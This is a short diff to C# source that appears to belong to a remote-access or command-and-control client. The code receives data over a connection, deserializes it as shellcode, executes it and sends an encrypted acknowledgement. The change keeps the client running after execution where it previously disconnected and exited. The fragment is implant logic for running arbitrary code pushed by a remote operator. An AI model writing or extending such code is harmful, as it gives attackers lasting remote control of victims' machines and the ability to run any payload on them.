@@ -68,10 +68,7 @@ class Client: IDisposable {
                     byte[] shellcode = Utils.DeserializeData(raw);
                     Utils.ExecuteShellCode(shellcode);
                     ws.WriteLine(Utils.SerializeBytes(Utils.EncryptData("Executing shellcode", iv, key)));
-
-                    // close connection after running shellcode
-                    Dispose();
-                    Environment.Exit(0);
+                    continue;
                 }
 
                 string[] parts = dec.Split(' ');
